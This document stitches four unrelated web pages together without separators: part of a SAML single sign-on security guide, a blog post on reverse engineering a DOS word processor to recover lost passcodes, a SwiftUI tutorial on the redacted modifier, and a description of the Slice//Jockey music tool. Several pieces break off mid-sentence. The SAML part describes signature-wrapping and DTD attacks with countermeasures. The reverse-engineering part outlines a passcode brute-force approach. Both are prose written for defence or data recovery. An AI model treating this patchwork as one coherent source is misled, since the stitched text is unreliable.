addressed when the pressure is on to just deliver <em>something </em>to unblock a high-value contract - as is oftentimes the case. However, to build SAML SSO safely and securely in-house requires significant buy-in and <a href="https://stackoverflow.blog/2019/07/11/single-sign-on-sso-stack-overflow-okta-integration/">investment by teams</a> - on the scale of months, representing hundreds of thousands of dollars in developer time.<strong>‍</strong></p><p><strong>If not done right, you expose your application and your customers to potentially huge security risks. </strong>To drive that home, here are just a few recently published SAML-related vulnerabilities:</p><ul role="list"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-15585">January 27, 2020</a> - “... GitLab SAML integration had a validation issue that permitted an attacker to takeover another user's account.”</li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-4427">May 7, 2020</a> - “... an attacker could exploit this [SAML] vulnerability to bypass the authentication process and gain full administrative access to the system [IBM Data Risk Manager].”</li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-21263">June 19, 2020</a> - “An attacker could authenticate to a different user's [Mattermost] account via a crafted SAML response.”</li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-2021">June 29, 2020</a> - “... improper verification of signatures in PAN-OS SAML authentication enables an unauthenticated network-based attacker to access protected resources.”</li></ul><p>It should be evident by now that oversights in SAML implementations are ubiquitous and problematic, even among experienced engineering teams.</p><p>So let’s dive into some of the more common security pitfalls developers building SAML-based SSO should be aware of, as well as cover a few suggested countermeasures. Just to be clear, <strong>this guide is by no means comprehensive</strong> and is meant to provide a starting point for SAML security considerations as well as some follow-on resources.</p><h2>Brief anatomy of a SAML response</h2><p>Let's say we're integrating our application with Okta via SAML. Below is an example of an XML document we might get when attempting to authenticate a user, containing a simplified but valid SAML response:</p><p>Like we mentioned earlier, the SAML spec is complex and responses can get lengthy, so this example is comparatively quite terse. Keeping things to what you should know before we go into SAML vulnerabilities, let’s walk through what the response (<strong><em>&lt;saml2p:Response&gt;</em></strong>) is communicating:<br></p><ul role="list"><li>Line 2 begins the SAML response, which has the unique ID <strong><em>id72697176167120131651975993</em></strong> and is intended for consumption by the <strong><em>workos-test</em></strong> service provider’s Assertion Consumer Service (ACS) URL, i.e. the endpoint <strong><em>https://api.workos-test.com/auth/okta/callback</em></strong>.</li><li>Line 3 specifies the issuer (<strong><em>&lt;saml2:Issuer&gt;</em></strong>) and contains the unique URI (also referred to as EntityID) of the IdP that issued the response, in this case <strong><em>http://www.okta.com/exk1klancwHzz1SNi357.</em></strong></li><li>Line 7 begins the assertion (<strong><em>&lt;saml2:Assertion&gt;</em></strong>) with the unique ID <strong><em>id7269717616793800631152500</em></strong>. An assertion is a package of information asserting the identity of a user, often containing additional user attributes like first / last name, email, ID, etc.</li><li>Line 8 specifies the issuer of the assertion itself, in this case also <strong><em>http://www.okta.com/exk1klancwHzz1SNi357</em></strong>.</li><li>Lines 9 - 30 contains the digital signature (<strong><em>&lt;ds:Signature&gt;</em></strong>) over the assertion, which should be validated to determine the authenticity of the assertion.</li><li>Lines 31 - 36 specify the subject (<strong><em>&lt;saml2:Subject&gt;</em></strong>) of the assertion, i.e. the authenticated principal / user corresponding to the unique identifier found in <strong><em>&lt;saml2:NameID&gt;</em></strong>, who in this case is <strong><em><a href="https://workos.com/cdn-cgi/l/email-protection" data-cfemail="5337363e3c13243c21383c207e3c3827327d303c3e">[email&nbsp;protected]</a></em></strong>.</li><li>Line 37 (<strong><em>&lt;saml2:Conditions&gt;</em></strong>) defines the window of time for which the assertion should considered valid, i.e. from <strong><em>NotBefore</em></strong> (inclusive) to <strong><em>NotOnOrAfter</em></strong> (exclusive).</li></ul><p>For the purposes of readability, the SAML 2.0 XML snippets in the remainder of this blog will be simplified, use shorthand, and be stripped of nodes that would otherwise be required in reality but are not relevant to what’s being illustrated. We’ll use a mythical IssueTracker, ContractManager, and PayrollService as hypothetical SPs that have implemented SAML authentication, which you should think of as placeholders for your application or other SAML SSO-enabled apps.</p><h2>Disable DTD processing</h2><p>The first step in processing a SAML response is parsing the payload. Parsing and loading an XML document into memory is an inherently expensive set of operations, but can be unexpectedly costly due to a feature of XML that allows references to external or remote documents, i.e. <a href="https://en.wikipedia.org/wiki/Document_type_definition">Document Type Definitions</a> (DTDs).</p><p>When a DTD is encountered, parsers will try to fetch and load the referenced document as well. If the referenced document is large enough or results in infinitely looping references, your server can be slowed or even brought down trying to complete the process. The same holds true if the payload itself is very large, DTDs or not.</p><p>Two low-hanging mitigations you should implement to prevent buffer overflows are:<br></p><ol role="list"><li>Limiting SAML payload size to &lt; 1MB. 1MB is a generous upper limit and should be tuned down based on average received payload size.</li><li>Configuring your XML parser to never fetch remote files or try to load and parse DTDs. Some XML parsers do so by default, for example, Python’s <a href="https://docs.python.org/3/library/xml.etree.elementtree.html"><strong><em>xml.etree.ElementTree</em></strong></a> module.</li></ol><p>XML processing, and thus by extension SAML response processing, is vulnerable to buffer overflow attacks from other scenarios described later on in this post. And unfortunately, protecting your application from a service outage is among the most mild of outcomes compared to the <a href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf">possibilities exploiting XML DTD</a> allows - it is a dark and anxiety-inducing rabbit hole.</p><p>So, if you’re not writing your own XML parser (generally not suggested), it’s important to <strong>vet the XML parser(s) your application and its dependencies use</strong> - ensure they handle other exploits like <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs</a> and <a href="https://en.wikipedia.org/wiki/Zip_bomb">Zip Bombs</a>.</p><h2>Validate the SAML response schema first<br></h2><p>The primary security mechanism in the SAML handshake is the cryptographic validation of <a href="https://en.wikipedia.org/wiki/XML_Signature">XML Signatures</a> (XML-DSig) - which establishes the trust chain between IdPs and SPs. XML-DSig validation should always be done prior to executing business logic; however, the separation between signature verification and operating on the rest of a SAML payload opens up SAML authentication to vulnerabilities exposed by what are called XML Signature Wrapping (XSW) attacks. &nbsp;These attacks have numerous permutations which can result in outcomes such as (but not limited to):<br></p><ul role="list"><li>Denial-of-service by inserting arbitrary elements that lead to buffer overflows.</li><li>Escalating permissions by injecting assertions that allow an adversary to impersonate and be authenticated as another user, like an account admin.</li></ul><p>The exploit here consists of modifying the payload without invalidating any signatures - think <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> or <a href="https://owasp.org/www-community/attacks/xss/">Cross Site Scripting,</a> but for for XML.</p><p>Original response (pre-XSW):</p><p>Modified response (post-XSW):</p><p>The broadest countermeasure to XSW attacks is <strong>validating the schema</strong> of the SAML XML document. Payloads for SAML responses of any given IdP should have a deterministic standard schema that can be used as a reference in a schema compliance validation module, which should be executed prior to XML-DSig verification. Here are <a href="https://github.com/onelogin/python3-saml/tree/master/src/onelogin/saml2/schemas">example schemas</a> used by OneLogin’s <strong><em>python3-saml</em></strong> package to perform <a href="https://pythonhosted.org/python-saml/library/saml2.html#saml2.utils.OneLogin_Saml2_Utils.validate_xml">XML schema validation</a>. <strong>Schemas should be vetted local copies</strong> as opposed to being fetched from 3rd party remote locations at runtime or on server start.</p><p>All of that being said, <a href="https://www.nds.ruhr-uni-bochum.de/media/nds/veroeffentlichungen/2013/03/25/paper.pdf">schema validation isn’t foolproof</a>; there is room for error in the validation module logic itself, as well as in the syntactic rigor of the reference schema. A second low-hanging countermeasure to XSW attacks that should be employed for the sake of redundancy is to <strong>always use absolute XPath expressions</strong> to select elements in processes post-schema validation. Explicit absolute XPath expressions set an unambiguous expectation for the location of elements.</p><p>Here’s an example of a valid response that’s been modified in an XSW attack (specifically a signature exclusion attack, more on that later):</p><p>This modification also exploits the common, incorrect, but not unreasonable assumption that a well-formed SAML response will only ever have a single assertion. So while XML-DSig verification would succeed for the signature returned by <strong><em>doc.getElementsByTagName(“Signature”)[0]</em></strong>, the assertion returned and processed by <strong><em>doc.getElementsByTagName(“Assertion”)[0]</em></strong> would be the injected <strong><em>snek</em></strong> assertion. This attack would have been more likely to fail if the XPath expression&nbsp;<strong><em>“/Response/Assertion[0]/Signature”</em></strong> was used in the assertion signature validation logic.</p><h2>Check that you’re the intended recipient</h2><p>This sounds obvious, but make sure to check that a SAML response is intended for your app. This is low-hanging fruit that can prevent attacks exploiting IdPs that use a shared private signing key for all integrated SPs of a given tenant, as opposed to issuing unique keys per application. The most common attack entails the …</p></figure></div></div></div>

<h2 id="intro">Intro</h2>
<p>In August 2020, we were commissioned by a client with a cache of locked QText documents from the mid 90s - to which he has lost the passcode.</p>

<p><a href="https://en.wikipedia.org/wiki/QText_(word_processor)">QText</a> was a DOS era Hebrew-English word processor written in Turbo Pascal, released 15 or so odd years before neither I or @Elisha had laid hands on a reverse engineering tool.</p>

<p>In this blog post, we’ll describe the process of analyzing the encrypted documents and reverse engineering a DOS program.</p>

<p>Hopefully we’ll be able to provide some insight into the early days of software development in Israel, and more generally into how cryptography was viewed and implemented in the early days of consumer software development.
We also hope to help preserve the knowledge and tools utilized here - a lot of which have scracely survived to this day.</p>

<h2 id="getting-started---qtext">Getting started - QText</h2>
<p>Luckily, we had access to working QText binaries, supplied by our client.
We loaded up an instance of the <a href="https://www.dosbox.com/">DOSBOX</a> emulator and proceeded to play around with the word processor for a while - focusing on the document encryption feature.</p>

<p>Our initial conclusions included the following:</p>
<ul>
  <li>The passcode is short - 4 characters and limited to uppercase characters and numbers - which represents a very small keyspace relative to modern compute power.</li>
  <li>Documents are normally some form of plain rich text - but locked documents have a \(0x1D\) header prepended to them. Documents with the same passcode have the same header (no salt).</li>
  <li>Out of \(0x1D\) header bytes - \(16\) are actually variable and correlate directly to the passcode - could it be the encryption key is included in the file?</li>
  <li>Unfamiliar encryption - seems to work on per-line and per-column basis, meaning equal plaintext lines would result in equal ciphertext lines. Spaces are skipped when encrypting, which indicates the per-column charateristic.</li>
</ul>

<center>
    <figure>
      <img src="https://pipornithology.dev/images/key_line.png" alt="First line of two documents with different passcodes - key is underlined">
      <figcaption><i>First line of two documents with different passcodes - key is underlined</i></figcaption>
    </figure>

    <figure>
      <img src="https://pipornithology.dev/images/space_nospace.png" alt="Payload from two documents with same passcode and plaintext - one is interlaced with spaces">
      <figcaption><i>Payload from two documents with same passcode and plaintext - one is interlaced with spaces</i></figcaption>
    </figure>
</center>

<p>So a very rudimentary system, as you might expect considering this was developed at a time before the internet was commonplace - let alone knowledge of cryptographic best-practice.</p>

<p>The key seems to be included in the file, but we don’t know the encryption mechanism. 
We could try and reverse engineer the encryption function, but brute-forcing the passcode is feasible, and in this case much simpler - if we have a fast way to test the passcodes.</p>

<p>Working under the relatively safe assumption that the 16 byte key in the file is somehow derived from the passcode - we can try and focus our RE efforts on the key derivation algorithm.
Our first guess was that the passcode was simply hashed using a hash function from that time, but that direction unfortunately didn’t pan out.</p>

<p>We set our sight on the key derivation algorithm and started taking apart the executable.</p>

<h2 id="reversing-ms-dos-binaries">Reversing MS-DOS binaries</h2>
<p>DOS operates in <a href="https://wiki.osdev.org/Real_Mode">real mode</a>, meaning the entire 16 bit address space is shared between all processes and is addressed using a 16 bit <a href="https://wiki.osdev.org/Segmentation">segment</a> selector and an additional 16 bit address - which are used to cover a usable memory range of 640KB.</p>

<p>Executables are not PEs, but <a href="https://en.wikipedia.org/wiki/DOS_MZ_executable">DOS MZ executables</a>.
The <code>file</code> utility recognizes our QTtext binary as a <a href="https://en.wikipedia.org/wiki/PKZIP">PKZip</a> packed SFX - self extracting executable.</p>

<center>
<img src="https://pipornithology.dev/images/file_util.png" alt="">
</center>

<h3 id="pkzip">PKZip</h3>
<p><a href="https://en.wikipedia.org/wiki/PKWare">PKWare</a> is responsible for the popularity of the ZIP file format as we know it today, 
and also for a for a widely used executable packer in the MS-DOS age.</p>

<p>There isn’t a lot of readily available information about the PKZip packer - presumably it utilized the same compression algorithm as the non-SFX zip utility,
but we were struggling to find a tool that would properly unpack the SFX to a functioning executable.</p>

<p>Having failed to find additional information about this packer, and wanting to avoid reverse engineering the unpacker stub - 
we attempted to use the DOSBOX debuggers CPU <code>LOG</code> feature to step past the unpacker code, sometime after the original entry point - and then extract the code from memory.</p>

<p>While this did work, it only accounted for a small part of the code - the executable was 24K in size (packed).</p>

<p>Recalling older days of reversing crackmes (though not as old as this program), we went looking for a generic executable unpacking tool which used to be a dime a dozen on cracking sites.</p>

<p>Preceding some open-source trends by over a decade, their inner-working were often mysterious, but most of the time they did the job.
Eventually we found the <a href="http://blog.ssokolow.com/archives/2018/12/02/resources-for-reverse-engineering-16-bit-applications/">following ssokolow blog post</a> which guided us to the the a mythical reverse engineering relic - <a href="https://www.exetools.com/">exetools</a>.</p>

<p>The unpacker page had a huge list of unpackers, we assume a lot of them would have done the job - as PKZip was fairly common. 
We first tried the one called <code>PKUNLITE</code>, and when that didn’t work (but looked promising) - we found success with <code>DISLITE v1.15</code>.</p>

<h3 id="int-3f---ms-dos-overlays">int 3f - MS-DOS Overlays</h3>
<p>Loading the binary in IDA Free 5.0 (which luckily is still in distribution - hosted at the <a href="https://www.scummvm.org/">ScummVM</a> website) showed that the executable utilized Turbo Pascal like memory overlays.</p>

<p>Since we’re running in real mode, paging/swapping memory wasn’t possible, and overlays were the solution to the limited memory space.</p>

<p>The overlay mechanism was essentially an implementation of page swapping in user-space:
The executable contained root segments of non-movable memory, and was accompanied by an <code>.ovr</code> file which contained additional code (in this case, a LOT of additional code).</p>

<p>The root code (which originates from the <code>.exe</code> file) is always mapped into memory, while segments of the overlay were mapped into memory selectively and swapped on-demand.</p>

<p>Calls between overlays (and the root segment) occured through a jump table, if the overlay was already mapped into memory, the jump table stubs were “linked” to its current location in memory.</p>

<p>Otherwise, it led to (in this case) an <a href="https://dos4gw.org/3F_-_Overlay_manager_interrupt_Microsoft_LINK_EXE_Borland_TLINK_VROOMM"><code>int 3f</code></a> instruction, and alongside it - the overlay metadata.</p>

<p>The overlay metadata contained - among other things - the file offset of the relevant code segment.</p>

<p>The interrupt handler would then map the relevant overlay into memory, in place of another overlay, and fix up the stubs, before resuming execution.</p>

<center>
    <figure>
      <img src="https://pipornithology.dev/images/unlinked_stub.PNG" alt="An example of an unlinked stub. Note the overlay metadata above.">
      <figcaption><i>An example of an unlinked stub. Note the overlay metadata above.</i></figcaption>

      <img src="https://pipornithology.dev/images/linked_stub.PNG" alt="Same stub, now linked after its overlay was loaded into memory.">
      <figcaption><i>Same stub, now linked after its overlay was loaded into memory.</i></figcaption>
    </figure>
</center>

<p>IDA does an excellent job in flattening and statically linking the stubs so we can reverse engineer the program in its entirety.</p>

<p>However this presented a challenge for us in dynamically debugging the code, since while the root segments were always loaded into the same memory area, the overlays would change location very often, making it impossible for us to place breakpoints properly.</p>

<p>Dredging up information about the Turbo Pascal overlay system was difficult, and the DOSBOX debugger did not conveniently support stepping out of the interrupt.</p>

<p>It’s likely that we could have reverse engineering the interrupt handler and found a place to break in right before resuming program execution in the newly loaded overlay,
but we eventually opted for a simpler solution - finding an overlay-to-root call that we could break on and then step out into the newly loaded overlay.</p>
<center>
    <figure>
      <img src="https://pipornithology.dev/images/overlay-to-root.PNG" alt="An example of a call from an overlay to the root segment.overlay-to-root.PNG">
      <figcaption><i>An example of a call from an overlay to the root segment.overlay-to-root.PNG</i></figcaption>
    </figure>
</center>

<p>In the above example <code>pascal_strncpy</code> is located in the root segment and its address is fixed and predictable. To break into the calling function in overlay 73, we would instead place a 
breakpoint at <code>pascal_strncpy</code> and step out into the calling function.</p>

<p>This is slightly arduous but for the fairly short task at hand it would work, and we had ample overlay-to-root calls to break on since the root segment hosted a lot of
Turbo Pascal standard functions.</p>

<h2 id="key-expansion-function">Key expansion function</h2>
<h3 id="tracing-through-passcode-flow">Tracing through passcode flow</h3>
<p>Finding the key expansion function took some reversing and a lot of tracing.
Our initial idea was perform hot spot analysis by using DOSBOX’s CPU <code>LOG</code> command to trace execution while repeatedly failing the passcode check on a locked document.</p>
<center>
<img src="https://pipornithology.dev/images/wrong_passcode.PNG" alt="">
</center>

<p>Eventually we went for a more direct approach and simply placed a breakpoint on the <code>int 21</code> interrupt handler to catch open and read calls.</p>
<center>
    <figure>
      <img src="https://pipornithology.dev/images/dosbox_int21_3d_open.PNG" alt="The DOSBOX debugger at a interrupt call to open. The requested path is seen in the data overview.">
      <figcaption><i>The DOSBOX debugger at a interrupt call to open. The requested path is seen in the data overview.</i></figcaption>
    </figure>
</center>

<p>We traced through an open on the document path and a read of \(0x1D\) bytes - which is the exact size of the header we saw in locked documents.
Continuing with dynamic debugging, we pinpointed a function that takes the entered passcode string and the \(0x1D\) header as parameters.</p>

<p>Digging in, we see how the the passcode is passed into an internal function, and the result is compared to the header.</p>

<center>
    <figure>
      <img src="https://pipornithology.dev/images/header_check.PNG" alt="Part of the passcode check flow - this function returns 1 if the passcode was valid.">
      <figcaption><i>Part of the passcode check flow - this function returns 1 if the passcode was valid.</i></figcaption>
    </figure>
</center>

<p>Presumably, the function call prior to the <code>memcmp</code> performs key expansion, and the result is then compared to the file header.</p>

<h3 id="key-derivation-function">Key derivation function</h3>
<p>The passcode is first passed through a permutation function which iteratively increments each byte of the passcode by the sum of all bytes in the string.
Before proceeding to the byte in the next position, a certain predicate is tested by using the value of the resulting byte as an index into a static bitmap - where each bit represents whether or not
that byte value is valid (1) or not (0). A more modern example of this sort of bitmap in use can be found in <a href="https://en.wikipedia.org/wiki/Control-flow_integrity">CFG</a>.</p>

      <p>In iOS 14, SwiftUI has a new modifier to redact any content. You apply it to any view with a new view modifier, <code>redacted(reason:)</code>. This modifier required a reason modifier, which tells SwiftUI the reason for this redaction. Right now, Apple provides only one reason, <code>.placeholder</code>.</p>
<p>Here’s how it looks:</p>
<pre><code><span><span>Text</span><span>(</span><span>"Hello, SwiftUI!"</span><span>)</span></span><br><span>    <span>.</span><span>redacted</span><span>(</span>reason<span>:</span> <span>.</span>placeholder<span>)</span></span></code></pre>
<figure>
  <img src="https://d33wubrfki0l68.cloudfront.net/cf0b92e42350e66b8b11e546ba02ecd2b5bbd27a/91d16/images/redacted-sample.png" alt="Redact with placeholder style">
  <figcaption>Redact with placeholder style</figcaption>
</figure>
<p>As the name implies, placeholder reason redact content in a way to be used as a placeholder before the actual content is loaded.</p>
<p>Since Apple design <code>RedactionReasons</code> as an option set, I expected more reason that we can use and combine in the future. Something like <code>.sensitive</code> reason with pixelation effect or <code>.animated</code> which produce a shimmering effect would be a nice add up.</p>
<pre><code><span><span>public</span> <span>struct</span> <span>RedactionReasons</span> <span>:</span> <span>OptionSet</span></span></code></pre>
<h2 id="complex-view">Complex View <a href="#complex-view">#</a></h2>
<p>Redaction reasons pass along to all child views. That's mean you can call it on a parent view, and all subviews would get the same reasons.</p>

<h2 id="opt-out">Opt-out <a href="#opt-out">#</a></h2>
<p>If you don't want some view to be redacted, you can opt-out by using <code>.unredacted()</code> which removes any redaction reason that is applied to the view.</p>
<pre><code><span><span>Text</span><span>(</span><span>"Big Sur <span><span>\(</span><span>Image</span><span>(</span>systemName<span>:</span> <span>"sun.dust"</span><span>)</span><span>)</span></span>"</span><span>)</span></span><br><span>        <span>.</span><span>font</span><span>(</span><span>.</span>title<span>)</span></span><br><span>        <span>.</span><span>fontWeight</span><span>(</span><span>.</span>bold<span>)</span></span><br><span>        <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>blue<span>)</span></span><br><span>        <span>.</span><span>unredacted</span><span>(</span><span>)</span></span></code></pre>
<p>Add <code>.unredacted()</code> to <code>Text</code> will produce the following result:</p>

<h2 id="caveats">Caveats <a href="#caveats">#</a></h2>
<p>At current Xcode beta (beta 6), redact a view only changes its appearance, but it can still receive user interaction. If you have a redacted button, beware that the button can still receive user action.</p>

<h2 id="redaction-aware-view">Redaction-aware view <a href="#redaction-aware-view">#</a></h2>
<p>We can make our view redaction-aware and respond to the redaction reason by observing the value in <code>@Environment(\.redactionReasons)</code>.</p>
<p>In the following example, we modify our LandmarkView to show SF Symbols image over the Big Sur image if a redaction reason is presented.</p>
<pre><code><span><span>struct</span> <span>LandmarkView</span><span>:</span> <span>View</span> <span>{</span></span><br><span>  @<span>Environment</span><span>(</span>\<span>.</span>redactionReasons<span>)</span> <span>private</span> <span>var</span> reasons </span><br><span>   </span><br><span>  <span>var</span> body<span>:</span> some <span>View</span> <span>{</span></span><br><span>    <span>VStack</span><span>(</span>alignment<span>:</span> <span>.</span>leading<span>)</span> <span>{</span></span><br><span>      <span>if</span> reasons<span>.</span><span>isEmpty</span> <span>{</span> </span><br><span>        <span>Image</span><span>(</span><span>"bigsur"</span><span>)</span></span><br><span>          <span>.</span><span>resizable</span><span>(</span><span>)</span></span><br><span>          <span>.</span><span>frame</span><span>(</span>width<span>:</span> <span>100</span><span>,</span> height<span>:</span> <span>100</span><span>)</span></span><br><span>          <span>.</span><span>clipShape</span><span>(</span><span>Circle</span><span>(</span><span>)</span><span>)</span></span><br><span>      <span>}</span> <span>else</span> <span>{</span></span><br><span>        <span>Image</span><span>(</span><span>"bigsur"</span><span>)</span></span><br><span>          <span>.</span><span>resizable</span><span>(</span><span>)</span></span><br><span>          <span>.</span><span>frame</span><span>(</span>width<span>:</span> <span>100</span><span>,</span> height<span>:</span> <span>100</span><span>)</span></span><br><span>          <span>.</span><span>clipShape</span><span>(</span><span>Circle</span><span>(</span><span>)</span><span>)</span></span><br><span>          <span>.</span><span>overlay</span><span>(</span> </span><br><span>            <span>Image</span><span>(</span>systemName<span>:</span> <span>"photo"</span><span>)</span></span><br><span>              <span>.</span><span>font</span><span>(</span><span>.</span><span>system</span><span>(</span>size<span>:</span> <span>34</span><span>,</span> weight<span>:</span> <span>.</span>bold<span>)</span><span>)</span></span><br><span>              <span>.</span><span>foregroundColor</span><span>(</span><span>.</span>white<span>)</span></span><br><span>              <span>.</span><span>unredacted</span><span>(</span><span>)</span><span>)</span></span><br><span>      <span>}</span></span><br><span>      <span>Text</span><span>(</span><span>"Big Sur <span><span>\(</span><span>Image</span><span>(</span>systemName<span>:</span> <span>"sun.dust"</span><span>)</span><span>)</span></span>"</span><span>)</span></span><br><span>        <span>.</span><span>font</span><span>(</span><span>.</span>title<span>)</span></span><br><span>        <span>.</span><span>fontWeight</span><span>(</span><span>.</span>bold<span>)</span></span><br><span>        <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>blue<span>)</span></span><br><span>        <span>.</span><span>unredacted</span><span>(</span><span>)</span></span><br><span>      <span>Text</span><span>(</span><span>"Lorem Ipsum is simply dummy text of the printing and typesetting industry.

<p>&lt;1&gt; We add <code>@Environment(\.redactionReasons)</code> for our view to read redaction reason and act accordingly.<br>

&lt;3&gt; If the reason is set (<code>.redacted</code> is applied), we show SF Symbols over our redacted image.</p>

<h2 id="conclusion">Conclusion <a href="#conclusion">#</a></h2>
<p>Tips and tricks in this article should be enough for you to work around limitations you encounter with redaction API. Even though we only have a redaction reason right now, I think Apple will support more variation in this API's rendering effect in the future, and I'm looking forward to it.</p>

<p>
Imagine a DJ set, and instead of turntables or cd players or iPods,
it has two recorders. Real-time-beat-slicing recorders. Sound from your
microphone is analysed, and sliced into coherent fragments which are engaged in
playback rightaway. Slice//Jockey is a crossover of music game and live
performance tool.
</p>

<img src="http://www.katjaas.nl/slicejockey/slicejockey3.gif" alt="">

<p>
Slice//Jockey is one fruit of [slicerec~] and [sliceplay~], Pure Data externals
designed for real-time beat slicing. The technique inside is discussed on
<a href="http://www.katjaas.nl/beatdetection/beatdetection.html">earlier pages</a>.
Slice//Jockey runs on Linux, MacOS and Windows, provided you have Pure Data
plus a few external libraries installed. Links for download and installation
are in the menu. Earlier versions of Slice//Jockey were targeted at
Pd-extended. Eight years after the first release in 2011, renewed interest in
the project resulted in Slice//Jockey version 3, now for vanilla Pd.
This webpage is updated accordingly, also to reflect shifts in the realm of
hardware and operating systems. The original page is archived
<a href="http://www.katjaas.nl/slicejockey/slicejockey-original.html">here</a>.

</p>

<p>
Slice//Jockey has detailed help files built into the project itself. Clicking
the question mark on the front opens an overview with a miniature Slice//Jockey
where you can click around further to open help windows on all buttons.
</p>

<img src="http://www.katjaas.nl/slicejockey/overview.gif" alt="">

<p>
In particular the quickstart window will help to get your first sounds into the
recorders. Despite its puzzling ascii labels, Slice//Jockey operation is pretty
intuitive. Global lay out and concept of Slice//Jockey are described here on
this page.
</p>



<p>
Two recorders are represented by blocks on the left and right side of the
window. Sound from the computer's soundcard channels is mixed to mono and sent
to both recorders. An input button [&gt;] on each recorder controls whether that
recorder is listening to your input audio or not. If it is listening, sounds
with clear attack will be recorded slice-wise automatically. Indicators above
the scope trace will tell you when recording happens.
</p>


<img src="http://www.katjaas.nl/slicejockey/SJslicycle.gif" alt="">

<p>
Up to 8 slices are stored in a circular buffer for each recorder. When the 9th
slice is recorded, the first one is discarded, and so on, following the FIFO
(first in, first out) principle.
</p>

<p>
Technically speaking, your computer could easily record thousands of slices
into memory. Restriction to eight slices per recorder is a conceptual choice,
not an issue of memory efficiency. All eight slices are engaged in playback. No
time for book keeping during live performance! If you want variation, just play
again into the recorders. Do not be afraid of overwriting a beautiful sound
with a dreadful squeak. That's life. The more you play, the better sounds you
will find.
</p>




<p>
Input sound for the recorders is subject to basic processing only. You can
activate a hi-pass filter, in case your microphone produces too much low
frequency content due to proximity effect. Further, you can enable a compressor
/ noise suppressor to make the recorders more selective to your sounds in a
noisy live situation. The mono input signal is plotted as a scope trace.
</p>

<img src="http://www.katjaas.nl/slicejockey/inputblock.gif" alt="">

<p>
Filter, compander and in-to-out buttons are found on the bottom-left of the
window, together with a time-signature (4/4 or 6/8) button. Notice those tiny
characters 'ZXCV'. They indicate shortcut keys for the buttons. Shortcut keys
only work when focus is on the Slice//Jockey window, and only for lower case
characters (they are printed as capitals because that is how they show on
keyboard keys).
</p>

<p>
It is beneficial to use a unidirectional microphone when feeding sound
into Slice//Jockey. Omnidirectional microphones like the ones built into
computers will pick up much of the speaker output and feed it back into the
recorder. The recorder will happily continue slicing under such conditions, and
results can be quite interesting. But it is better to have control over it. You
can always point a unidirectional mic to the speaker deliberately if you want
chaos. The picture below shows
<a href="http://www.katjaas.nl/DIYmic/DIYmic.html">DIY unidirectional mics</a>
that connect directly to computer mic input jack.

Hints for running Pd as a realtime process on Linux are on
<a href="https://puredata.info/docs/faq/how-can-i-run-pd-with-realtime-priority-in-gnu-linux">puredata.info</a>.
Real time priority for Pd reduces the risk of audio dropouts.





<p>
The x-y field has twenty control objects in two dimensions. This means, some 40
parameters are controlled on the surface which is printed below with it's
actual size. Resolution and precision is much better than for 40 knobs or
faders with each 1/40 of the field surface. Not surprisingly, the x-y layout is
inspired by Korg's famous Kaoss Pad, but also by computer music applications
like
<a href="http://jeremywentworth.com/">Jeremy Wentworth's</a>
GrainMainFrame.
</p>

<img src="http://www.katjaas.nl/slicejockey/xy-multipad.gif" alt="">

<p>
With all buttons and x-y objects at the size of a fingertip Slice//Jockey is most conveniently operated from a touch screen, good old mouse being a less hands-on alternative. More about touch screens in the section about hardware further down.
</p>






<p>
Slice//Jockey records slices of audio into a circular buffer, while storing
cuepoints for start and end of each slice. As stated, slices are engaged in
playback immediately. But how is playback controlled? Obviously, you can not
make a composition or midi sequence on beforehand for sounds still to be
recorded. Instead, playback is triggered according to very basic principles,
and manipulated with some controls.
</p>

<p>
Each recorder has three players associated: one for quarter notes, one for
eighth notes and one for sixteenth notes. If you want, the players can be
disconnected from BPM-synched triggering, to play with random time intervals.
Each player follows a pattern to select slices for playback. These patterns are
generated by a mathematical routine which guarantee optimal variation within a
cycle of sixteen triggers. If you move playback controls, conditions for these
routines change, and different patterns will result. For sixteenth notes, the
pattern cycle is one bar. For eighth notes the pattern encompasses two bars,
and for quarter notes four bars. If you want, the players can be disconnected
from pattern-wise triggering, to play randomly selected slices.
</p>

<img src="http://www.katjaas.nl/slicejockey/notes.gif" alt="">

<p>
These are playback controls on the x-y field, for quarter notes, eight notes
and sixteenth notes. In horizontal direction, slice playback speed is set.
Playback speed determines pitch, like a record or tape which is slowed down or
sped up. Slice playback speed/pitch is independent from BPM tempo or trigger
tempo.
</p>

<p>
In vertical direction, the controls set variation in playback speed, as an
addition to the basic playback speed which was set in horizontal direction.
Variation of playback speed does not mean vibrato. From start till end of one
slice, playback speed will remain constant. Playback speed will only vary from
one slice to the next.
</p>

<p>
Each of both recorder-playback sections has it's own effects controls on the
x-y field. There is feedback delay, resonant filter, distortion and reverb.
</p>

<p>
Left and right sections each have their own colour, which is reflected in
controls on the x-y field. Here we see white-coloured controls, belonging to
the left section.
</p>

<img src="http://www.katjaas.nl/slicejockey/effects.gif" alt="">

<p>
Global controls on the x-y field are colored black. They control:
    </p><ul>
        <li>input signal level</li>
        <li>output signal level and crossfader</li>
        <li>reverb for input signal</li>
        <li>BPM value and 16th note triplet feel</li>
        <li>global pitch</li>
    </ul>


<img src="http://www.katjaas.nl/slicejockey/globals.gif" alt="">

<p>
The right bottom of the window has buttons for help, settings, and session
recorder. A simple soundfile player is included for quick evaluation. Below
them is a beat indicator, counting beats according to the BPM value on the x-y
field. Notice that the beat indicator will always sync with your live session,
and not with soundfiles played back.
</p>

<img src="http://www.katjaas.nl/slicejockey/recorder.gif" alt="">




<p>
Clicking the exclamation mark on the front window pops a window with technical
settings. When preparing for a Slice//Jockey session, it may be necessary to
tune some of these settings. This window has it's own help file to guide you
through options.
</p>

<img src="http://www.katjaas.nl/slicejockey/settings.gif" alt="">

<p>
Here I want to highlight Pure Data's audio settings, where you can select input
and output devices for the program. Slice//Jockey listens to the input device
which is set here. Do not forget to check the checkbox for input device, and
set the appropriate number of channels. After selecting your devices, click
'apply' and 'ok'. Below is Pd's audio properties window for MacOSX. The window
looks different for other operating systems.
</p>

<img src="http://www.katjaas.nl/slicejockey/audiosettings.gif" alt="">
<img src="http://www.katjaas.nl/slicejockey/audiosettings2.gif" alt="">

<p>
Another setting to be highlighted is 'silence-threshold'. It's value determines
at what sound level slice recording will end if there is nothing useful to hear
